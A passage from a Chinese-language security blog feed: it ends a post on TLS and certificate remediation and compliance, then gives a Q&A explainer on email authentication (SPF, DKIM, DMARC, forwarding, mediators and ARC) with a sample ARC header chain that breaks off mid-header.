&lt;h3 id=&quot;%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-4&quot;&gt;#&lt;/a&gt; &lt;strong&gt;風險修復參考資料：&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;協議過舊：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/zh-tw/security/engineering/disable-legacy-tls&quot;&gt;&lt;strong&gt;Windows Server 2019 現已依憑證繫結提供 TLS 版本強制執行功能 - Security documentation&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;憑證相關：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;aws:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.aws.amazon.com/acm/latest/userguide/acm-overview.html&quot;&gt;&lt;strong&gt;What Is AWS Certificate Manager?&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;gcp(load balancer):&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://cloud.google.com/load-balancing/docs/ssl-certificates/google-managed-certs&quot;&gt;&lt;strong&gt;Using Google-managed SSL certificates | Load Balancing | Google Cloud&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;gcp(k8s engine):&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://cloud.google.com/kubernetes-engine/docs/how-to/managed-certs&quot;&gt;&lt;strong&gt;Using Google-managed SSL certificates&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;azure key vault:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/key-vault/certificates/certificate-scenarios&quot;&gt;&lt;strong&gt;Get started with Key Vault certificates&lt;/strong&gt;&lt;br&gt;
&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; &lt;strong&gt;結論&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;將風險與法規比對並不是為了說明若是未修復風險會違反多少法規，而是為了藉著風險的修復來佐證自身對於法規的重視，舉例來說， 當客戶詢問公司有沒有符合 GDPR 的規範時，若是能夠提供憑證的風險修復紀錄，其實就是一個很好的佐證資料。&lt;/p&gt;
&lt;p&gt;而本文所提到的改善複雜度，則是為了目前常見的資源有限但問題不會消失的情況而提供決策的輔助，目前市面上有許多相關的評估報告和掃描也是圍繞著風險管理的概念延伸，若是能因此而管理自身的風險以及對應的法規並找到最適的風險修復方案的話，無論是在稽核或是安全性的管控上都是一筆十分划算的投資。&lt;/p&gt;
&lt;h2 id=&quot;%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80%EF%BC%9A&quot;&gt;#&lt;/a&gt; 延伸閱讀：&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;資安科普番外篇（一）-大意了啊沒有閃！常見網站曝險你中了幾項？！&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-common-risk-exposure/&quot;&gt;大意了啊沒有閃！常見網站曝險你中了幾項？！&lt;/a&gt;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;%E5%8F%83%E8%80%83%E6%96%87%E7%8D%BB%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E6%96%87%E7%8D%BB%EF%BC%9A&quot;&gt;#&lt;/a&gt; 參考文獻：&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;PCIDSS&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://kirkpatrickprice.com/video/pci-requirement-6-develop-maintain-secure-systems-applications/&quot;&gt;https://kirkpatrickprice.com/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;ISO27001&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.isms.online/iso-27001/annex-a-10-cryptography/&quot;&gt;https://www.isms.online/iso-27001&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;GDPR&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://gdpr-info.eu/art-24-gdpr/&quot;&gt;https://gdpr-info.eu&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>關於 email security 的大小事 — 延伸篇</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra/"/>
		<updated>2021-07-23T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;!-- 隨著前幾篇 email security 的介紹，我陸陸續續收到了一些問題，在交流的過程中覺得有一些很重要或是很有趣的討論可以更延伸探討。以下採取 Q&amp;A 的格式，記錄一些討論與延伸知識。 --&gt;
&lt;!-- summary --&gt;
&lt;p&gt;隨著前幾篇 email security 的介紹，我陸陸續續收到了一些問題，在交流的過程中覺得有一些很重要或是很有趣的討論可以更延伸探討。&lt;br&gt;
不過因為原理篇跟設定篇希望可以聚焦在核心觀念上避免主題太發散，所以決定另外開一篇來聊聊這些東西。&lt;/p&gt;
&lt;p&gt;篇幅上會採取 Q&amp;amp;A 的格式，記錄一些討論與延伸知識。若資訊有誤請不吝指正，也歡迎大家提問，讓這一串問答越來越齊全 XDDD&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#q1&quot;&gt;&lt;strong&gt;Q1: SPF DKIM DMARC 這些看起來都是 2014 左右才出現的，滿好奇在這之前是怎麼驗證的，還是其實完全沒驗證？&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#q2&quot;&gt;&lt;strong&gt;Q2: Forwarding 上一篇提到很多次，是什麼意思？跟按信件上面那個箭頭轉發信件一樣嗎？&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#q3&quot;&gt;&lt;strong&gt;Q3: 『中繼 email server 』也提到很多次耶，他是哪些情況會出現？有可能是任意 domain （就是跟收件者跟寄件者本身都沒什麼關係）嗎？&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#q4&quot;&gt;&lt;strong&gt;Q4: &lt;code&gt;smtp.MailFrom&lt;/code&gt; 跟 &lt;code&gt;header.From&lt;/code&gt; 可以不同，然後 alignment 又不過，那 DMARC 不就失敗嗎？&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#q5&quot;&gt;&lt;strong&gt;Q5: 承上，那之前提到的 ARC 怎麼解這個問題？&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#q6&quot;&gt;&lt;strong&gt;Q6: 常常看到 SPF 用 &lt;code&gt;~all&lt;/code&gt; 而不是 &lt;code&gt;-all&lt;/code&gt;，有什麼差？&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一樣附上前幾篇的連結，建議看不懂的名詞可以回去參照原理篇：&lt;br&gt;
&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory&quot;&gt;關於 email security 的大小事 — 原理篇&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;設定篇們：&lt;br&gt;
&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf&quot;&gt;關於 email security 的大小事 — 設定篇 SPF&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc&quot;&gt;關於 email security 的大小事 — 設定篇 DKIM、DMARC&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples&quot;&gt;關於 email security 的大小事 — 範例篇&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;q1&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#q1&quot;&gt;#&lt;/a&gt; Q1: SPF DKIM DMARC 這些看起來都是 2014 左右才出現的，滿好奇在這之前是怎麼驗證的，還是其實完全沒驗證？&lt;/h2&gt;
&lt;p&gt;SPF 與 DKIM 其實早在 2000 跟 2004 年左右就有在討論了，只是一直沒有訂出標準、更遑論普及，真正受到重視是在 2014 年左右，也是因為這樣才延伸出 DMARC 的。在此之前為了防範釣魚跟垃圾信件，往往都是用黑名單的方式，也就是把已經知道的某些惡意 IP 或是 mail server 列在一個黑名單裡面過濾掉。這跟現在過濾惡意 domain 的方法一樣，都是事後防範（reactive）。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;q2&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#q2&quot;&gt;#&lt;/a&gt; Q2: Forwarding 上一篇提到很多次，是什麼意思？跟按信件上面那個箭頭轉發信件一樣嗎？&lt;/h2&gt;
&lt;p&gt;是也不是。&lt;/p&gt;
&lt;p&gt;Forwarding 並不是在 RFC 裡定義明確的一個詞，而是我們用來泛指『轉發』這個動作的用語，負責 forwarding 的 mail server 就稱為 forwarding server 或是 &lt;strong&gt;mediator&lt;/strong&gt;（中間人）。&lt;/p&gt;
&lt;p&gt;技術上我會把 forwarding 狹義定義為：在信封袋上（SMTP envelope）更改收信人（&lt;code&gt;smtp.RcptTo&lt;/code&gt;）但保留寄件人（&lt;code&gt;smtp.MailFrom&lt;/code&gt;）的行為。與 forwarding 相對，連信封袋上的寄件人（&lt;code&gt;smtp.MailFrom&lt;/code&gt;）都改寫的行為，就稱為 remailing。舉例來說，假設你有個住在國外且準備回國的朋友，又有個很想買但不外送台灣的精品包包，forwarding 就像是請朋友幫你下訂然後順便帶回來，包裹上寫的還是精品公司的名字；remailing 則是朋友收到包包後用跨國快遞寄回來，包裹上寫的是朋友的名字。&lt;/p&gt;
&lt;p&gt;我們之前提過的 mailing list 就是一種 remailing，它的原理是由一個 mail server 維護一個負責接收信的 reflector 信箱跟訂閱者清單（subscribers），當你想要寄一封信給眾訂閱者時，可以用自己的信箱把信寄到 reflector，這樣就會觸發 mail server 把自己加到 &lt;code&gt;header.Reply-To&lt;/code&gt; 跟 &lt;code&gt;smtp.MailFrom&lt;/code&gt; ，再自動幫你把原信件轉發給所有訂閱者。有些 marketing email 會這麼做，或是你在一些學術討論串裡也會看到（其實就是 email 版本的聊天室）。這樣做的好處是可以自動化管理訂閱者清單、寄信人不用另外申請新的信箱、而且 mediator 可以視情況修改信件內容，例如在主旨加上標籤或是過濾文字。&lt;/p&gt;
&lt;p&gt;回到主題，根據&lt;a href=&quot;https://en.wikipedia.org/wiki/Email_forwarding&quot;&gt;維基百科&lt;/a&gt;，粗略可以將 forwarding 分成 Server-based forwarding 跟 Client-based forwarding。&lt;/p&gt;
&lt;p&gt;Client-based forwarding ，或稱 resending，又能分成自動和手動，自動的例子是有些會議軟體會允許受邀者修改時間或是會議內容等資訊，然後自動以主辦者的名義再次寄送或更新邀請給所有與會者，此時就會導致 &lt;code&gt;smtp.MailFrom&lt;/code&gt; 跟 &lt;code&gt;header.From&lt;/code&gt; 不相等。手動的部分就是一般人在 MUA 裡會用到的信件轉發，當我們手動按下轉發箭頭的時候，會把原信件 inline 嵌入到新信件裡，並完整保留附件以及 &lt;code&gt;header.From&lt;/code&gt;、&lt;code&gt;header.Reply-To&lt;/code&gt; 欄位。上述兩個例子中，其實寄件人（&lt;code&gt;smtp.MailFrom&lt;/code&gt;）已經不是原本的寄件人了，所以比起 forwarding 這種行為更接近 remailing。&lt;/p&gt;
&lt;p&gt;那 Server-based forwarding 是什麼呢？許多 mail server 提供一個功能，讓你可以任意創建信箱地址，然後連到你自己本來擁有的信箱，方便信件集中處理。這種情況又被稱作 re-addressing 或 email aliasing，也就是信箱別名，是一種非常常見的應用。&lt;/p&gt;
&lt;p&gt;情境例如：為了讓客戶好辨認，你的公司（&lt;code&gt;candies.com&lt;/code&gt;）為不同產品創建了多個客服信箱（&lt;code&gt;cookie@candies.com&lt;/code&gt;、&lt;code&gt;chocolate@candies.com&lt;/code&gt; 、&lt;code&gt;gummies@candies.com&lt;/code&gt;），不過因為公司只有你一個客服，所以所有寄到這些信箱的信件其實都會被導到你的個人信箱，如 &lt;code&gt;jemmy88@gmail.com&lt;/code&gt; 或是&lt;code&gt;jemmy01@outlook.com&lt;/code&gt; 。 當然，要設定數個別名也行（你有新的客服夥伴一起處理信件啦），總之可以想成是創造一個統一對外的窗口，進來後再分發。早期的 sendmail 就是用一個檔案 &lt;code&gt;~/.forward&lt;/code&gt; 來記錄這些一對多的 alias 關係再根據這些規則進行 forwarding。&lt;/p&gt;
&lt;p&gt;或者，你讀大學的時候本來有個學校信箱，畢業之後想繼續維持這個校友地址，但學校並不想負擔信件儲存的成本，這時就能用別名的方式讓信箱地址依然存在，不過信件所有寄到校友信箱的郵件就會被 forward 到你的其他私人信箱。&lt;/p&gt;
&lt;p&gt;不管哪個 aliasing 情境，信件本身（&lt;code&gt;header&lt;/code&gt; 跟 &lt;code&gt;body&lt;/code&gt;）跟信封袋上的寄件人（&lt;code&gt;smtp.MailFrom&lt;/code&gt;）都是不變的。也就是說，收信人看到的內文都是原汁原味，點擊回覆的時候也是回給寄件人而不是中間 forwarding 的 mail server。雖然走過必留痕跡，forwarding 也會在原始信件中的 trace 被記錄下來，但就雙方 end user 溝通的角度而言，中間這層 forwarding 其實是隱形的。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;q3&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#q3&quot;&gt;#&lt;/a&gt; Q3:『中繼 email server 』也提到很多次耶，他是哪些情況會出現？有可能是任意 domain （就是跟收件者跟寄件者本身都沒什麼關係）嗎？&lt;/h2&gt;
&lt;p&gt;這個問題的詳細回答可以看看上面的 Q2，『中繼 email server 』是我敘述中比較通俗的用語，指的是寄信方跟最終收信方中間的 hop，在 RFC 定義中較為正式的名字是 &lt;strong&gt;mediator&lt;/strong&gt;，也就是中間人。&lt;/p&gt;
&lt;p&gt;mediator 其實不能說是一台 server，而是『提供 reposting 的複合式角色』，它涵蓋了 MTA 的 relay 功能、MUA 的撰寫信件功能、以及 MDA 的地址查詢功能。mediator 也並非是固定的角色，例如一封信從 A 的 mail server 寄到 B 的 mail server，然後 B 再把信轉發到 C mail server，對 A 跟 B 而言這封信沒有經過任何 mediator，但對 C 而言 B 的 mail server 就扮演了 mediator 的角色。&lt;/p&gt;
&lt;p&gt;回到問題，mediator 可以是外部、第三方的服務，所以當然可能是跟收件者寄件者無關的 domain。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;q4&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#q4&quot;&gt;#&lt;/a&gt; Q4: &lt;code&gt;smtp.MailFrom&lt;/code&gt; 跟 &lt;code&gt;header.From&lt;/code&gt; 可以不同，然後 alignment 又不過，那 DMARC 不就失敗嗎？&lt;/h2&gt;
&lt;p&gt;是的！其實 DMARC 會失敗的情況非常多，甚至還出了一個 &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7960&quot;&gt;RFC7960&lt;/a&gt; （Interoperability Issues between Domain-based Message Authentication,&lt;br&gt;
 Reporting, and Conformance (DMARC) and Indirect Email Flows）討論呢！&lt;/p&gt;
&lt;p&gt;Indirect Email Flows 就是間接的寄信方式，包含前面 forwarding 提過的 alias 跟 mailing list，還有很多有趣的案例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;當 MUA 嘗試以別人的身份寄信：有些新聞或是雜誌網站會有 “forward-to-friend” 功能，或是有些會有 “send-as” 功能。&lt;/li&gt;
&lt;li&gt;有些 IoT 或嵌入式設備會用 hardcoded domain 寄信，或是以 device owner 身份寄信&lt;/li&gt;
&lt;li&gt;有些 MTA 可能會修改信件內文的 encoding 或是 header 的欄位（例如日期格式），造成 DKIM 驗證錯誤&lt;/li&gt;
&lt;li&gt;MDA 也可能會在過濾時使用一些修改信件的功能，例如使用 &lt;code&gt;add_header()&lt;/code&gt; 跟 &lt;code&gt;delete_header()&lt;/code&gt; 等函式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上都是合理應用範圍但是 DMARC 不支援的情境，只要是有經過 mediator 轉達或是有修改到信件內容，要嘛驗證不過要嘛 alignment 不過，幾乎都會讓 DMARC 失敗。尤其大家如果都有好好設置成 &lt;code&gt;p=reject&lt;/code&gt; 更是一點轉圜餘地都沒有了。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;q5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#q5&quot;&gt;#&lt;/a&gt; Q5: 承上，那之前提到的 ARC 怎麼解這個問題？&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;ARC（Authenticated Received Chain）&lt;/strong&gt; 的宗旨就是為了解決 Indirect Email Flow 的問題，試圖加上更多驗證資訊讓本來準備丟掉 DMARC 失敗的信的 MDA 能重新考慮、通融一下。&lt;/p&gt;
&lt;p&gt;ARC 在 2019 年才成為 RFC 上的文件，仍屬實驗性質（experimental），因此目前有實作與支援的廠商也不多，在我較熟知的範圍裡只有最大的 Gmail 跟 Microsoft Office 365。&lt;/p&gt;
&lt;h3 id=&quot;%E5%8E%9F%E7%90%86&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8E%9F%E7%90%86&quot;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;回想一下需要 ARC 的最大原因，就是因為經過 mediator 的過程中發生信件的修改更動或是來源不同，所以導致收信方認為自己拿到的『已經不是原本的信件』。但這樣多冤枉呀，信件經過 mediator 之前都是合法的，但最終是否能被收到卻只以收信方的 DMARC 驗證為主，這就像是你從台灣經過日本轉機到美國，美國海關卻打死認為你一定是日本人一樣荒謬啊！&lt;/p&gt;
&lt;p&gt;所以追根究底，只要能夠證明『經過 mediator 前的原始信件』跟『mediator 更動的部分』都是合法的，那就沒有疑慮了吧？&lt;/p&gt;
&lt;p&gt;因此 ARC 的運作方式，就是讓每一個 mediator 在經手信件時對信件做一次 DMARC 驗證，並將驗證結果、先前所有 hop 的 ARC 驗證結果、以及自己做的修改簽名，附在信封袋上作為擔保。每一個擔保的內容都接續著之前經過的 mediator 的擔保，因此會構成一條鏈（Authenticated Received &lt;strong&gt;Chain&lt;/strong&gt;），假設鏈上的每個 mediator 都值得信任，那合理推論也可以相信他們所做的 DMARC 驗證結果吧！這樣當最後的終端收信 mail server 自己執行 DMARC 驗證失敗時，就可以透過 ARC 發現『啊，原來原始信件有通過 DMARC，只是中間經過了這些修改所以不一樣了呀』。&lt;/p&gt;
&lt;p&gt;這個『附在信封袋上的擔保』就是 &lt;strong&gt;ARC Set&lt;/strong&gt;，是包含下面三個 ARC header 的一組紀錄。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ARC-Authentication-Results (AAR)：『我做的 DMARC 跟 ARC 驗證』。紀錄此次 DMARC 驗證的結果以及先前每一組 ARC Set 驗證的結果。&lt;/li&gt;
&lt;li&gt;ARC-Message-Signature (AMS)：『我更動的部分並署名』。類似 DKIM Signature 的簽章，內容包含原始信件的各種 header 跟 DKIM Signature，還有新增或是更動的 header。&lt;/li&gt;
&lt;li&gt;ARC-Seal (AS)：『我核可信上所有的 ARC Set 並署名』。類似 DKIM Signature 的簽章，內容包含收到信件時已經紀錄的所有 ARC Set 以及剛剛新加的 AAR 跟 AMS。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ARC-Seal 的意義是什麼呢？大家可能有經驗，如果去銀行或是公家單位辦事情，在填文件的時候寫錯了，有需要塗改的地方或是新增的備註，會請你在新的資料上蓋自己的印章以茲證明。ARC-Seal 的概念就是在層層印章印上再押上自己的名字，以示『我核可了過去的這一串簽名，當然還有我自己的部分』。&lt;/p&gt;
&lt;h3 id=&quot;%E4%BE%86%E5%80%8B%E7%AF%84%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E4%BE%86%E5%80%8B%E7%AF%84%E4%BE%8B&quot;&gt;#&lt;/a&gt; 來個範例&lt;/h3&gt;
&lt;p&gt;下面是一封原始信件的 ARC Set。所有的 header 都是用 stack 的方式紀錄，所以最先加的是紫色的 AAR ，再來是藍色的 AMS，最後是紅色的 AS。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-extra/arc-set.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;ARC set from &lt;a href=&quot;http://onedegree.hk/&quot;&gt;onedegree.hk&lt;/a&gt; to gmail&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先可以注意到的是，三個 header 中都由一樣的 &lt;code&gt;i&lt;/code&gt; 標籤開始，這是一個類似 nonce、counter、或 ID 的數字，代表是第幾個經過的 mediator，從 1 開始累加。 所以假設我是收到上面這封信的 mediator，我要新增的 ARC Set 就都會標示 &lt;code&gt;i=2&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;再來分別看看各個 header。紫色的 AAR 就是一般的 DMARC 驗證結果，可以看到最後是 &lt;code&gt;pass&lt;/code&gt;。藍色的 AMS 幾乎跟 DKIM Signature 一樣，淡藍色的框是新增的 header，最末是原始信件的 DKIM Signature。紅色的 AS 也類似類似 DKIM Signature，但只簽 ARC Set 所以沒有 &lt;code&gt;h&lt;/code&gt;、&lt;code&gt;bh&lt;/code&gt; 等標籤。&lt;/p&gt;
&lt;p&gt;最重要的是 &lt;code&gt;cv&lt;/code&gt; ，代表 &lt;strong&gt;C&lt;/strong&gt;hain &lt;strong&gt;V&lt;/strong&gt;alidation Status，也就是這條鏈的驗證結果。每一個 mediator 的 &lt;code&gt;cv&lt;/code&gt;會根據前一個 mediator 紀錄的 &lt;code&gt;cv&lt;/code&gt; 以及各個 ARC Set 的驗證結果決定。當一個 mediator 得出 fail 的結論，他就會停止演算法並標記 &lt;code&gt;cv=fail&lt;/code&gt;，且加入的 AS 只會簽署當前新增的 ARC Set，等同打斷這條鏈並將發生錯誤的 ARC Set 視為唯一一組 ARC Set。此後的 mediator 一看到 &lt;code&gt;cv=fail&lt;/code&gt; 就會停下不做任何驗證，也不會新增 ARC Set。&lt;/p&gt;
&lt;p&gt;因為圖中是第一個 mediator（&lt;code&gt;i=1&lt;/code&gt;）所以 &lt;code&gt;cv=none&lt;/code&gt;，畢竟鏈正要開始當然沒有東西可以做 Validation。 另外這裡沒有標示，但是後續的 AAR 會有一個 &lt;code&gt;arc=&lt;/code&gt; 的標籤，會根據先前每個 ARC Set 中的 AMS 跟 AS 做驗證，確保鏈的完整性沒有被破壞。&lt;/p&gt;
&lt;p&gt;例如下圖（取自 RFC ）就是經過三個 mediator 的情況，只看螢光字的 &lt;code&gt;arc=&lt;/code&gt;，你會發現 &lt;code&gt;i=2&lt;/code&gt; 的 mediator 驗證了 &lt;code&gt;i=1&lt;/code&gt; 的 AMS 跟 AS，然後 &lt;code&gt;i=3&lt;/code&gt; 的 mediator 驗證了 &lt;code&gt;i=1,2&lt;/code&gt; 的 AMS 跟 AS。&lt;/p&gt;
&lt;p&gt;你可能會疑問，為什麼在 &lt;code&gt;i=3&lt;/code&gt; 的 mediator 那裡有一個 &lt;code&gt;fail&lt;/code&gt; 還是得出 &lt;code&gt;arc=pass&lt;/code&gt; 的結論呢？&lt;/p&gt;
&lt;p&gt;因為 &lt;code&gt;i=2&lt;/code&gt; 的 mediator 對信件進行了修改，所以到 &lt;code&gt;i=3&lt;/code&gt; 的 mediator 這裡時信件的 hash 已經不符合 &lt;code&gt;ams.1&lt;/code&gt; 解密後的結果了。但是因為符合 &lt;code&gt;ams.2&lt;/code&gt;，所以可以推論信件除了 &lt;code&gt;i=2&lt;/code&gt; 的 mediator 之外沒有被其他人動過。既然前一個 &lt;code&gt;ams.2&lt;/code&gt; 跟所有的 &lt;code&gt;as&lt;/code&gt; 都過了，這條鏈是沒有問題的，給 &lt;code&gt;cv=pass&lt;/code&gt;！&lt;/p&gt;
&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Seal: i=3; a=rsa-sha256; cv=pass; d=clochette.example.org; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    s=clochette; t=12345;b=CU87XzXlNlk5X/yW4l73UvPUcP9ivwYWxyBWc  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    VrRs7+HPx3K05nJhny2fvymbReAmOA9GTH/y+k9kEc59hAKVg==  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Message-Signature: i=3; a=rsa-sha256; c=relaxed/relaxed; d=  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    clochette.example.org; h=message-id:date:from:to:subject; s=  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    clochette; t=12345;bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZY  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    LQ=;b=o71vwyLsK+Wm4cOSlirXoRwzEvi0vqIjd/2/GkYFYlSd/GGfKzkAgPqx  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    fK7ccBMP7Zjb/mpeggswHjEMS8x5NQ==  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Authentication-Results: i=3; clochette.example.org; spf=fail  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    header.i=@d1.example; dmarc=fail; &lt;/span&gt;&lt;br&gt;&lt;mark class=&quot;highlight-line highlight-line-active&quot;&gt;    arc=pass (as.2.gmail.example=pass,  &lt;/mark&gt;&lt;br&gt;&lt;mark class=&quot;highlight-line highlight-line-active&quot;&gt;    ams.2.gmail.example=pass, as.1.lists.example.org=pass,  &lt;/mark&gt;&lt;br&gt;&lt;mark class=&quot;highlight-line highlight-line-active&quot;&gt;    ams.1.lists.example.org=fail (message has been altered))  &lt;/mark&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;Authentication-Results: clochette.example.org; spf=fail  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    header.i=@d1.example; dmarc=fail; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    arc=pass (as.2.gmail.example=pass,  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    ams.2.gmail.example=pass, as.1.lists.example.org=pass,  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    ams.1.lists.example.org=fail (message has been altered))  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Seal: i=2; a=rsa-sha256; cv=pass; d=gmail.example; s=20120806;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    t=12345; b=Zpukh/kJL4Q7Kv391FKwTepgS56dgHIcdhhJZjsalhqkFIQ  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    QAJ4T9BE8jjLXWpRNuh81yqnT1/jHn086RwezGw==  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    gmail.example; h=message-id:date:from:to:subject;s=20120806;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    t=12345; bh=KWSe46TZKCcDbH4klJPo+tjk5LWJnVRlP5pvjXFZYLQ=;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    b=CVoG44cVZvoSs2mMig2wwqPaJ4OZS5XGMCegWqQs1wvRZJS894tJM0xO1  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    RJLgCPsBOxdA59WSqI9s9DfyKDfWg==  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;ARC-Authentication-Results: i=2; gmail.example; spf=fail  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;highlight-line&quot;&gt;    smtp.from=jqd@d1.example; dkim=fail (512-bit key)  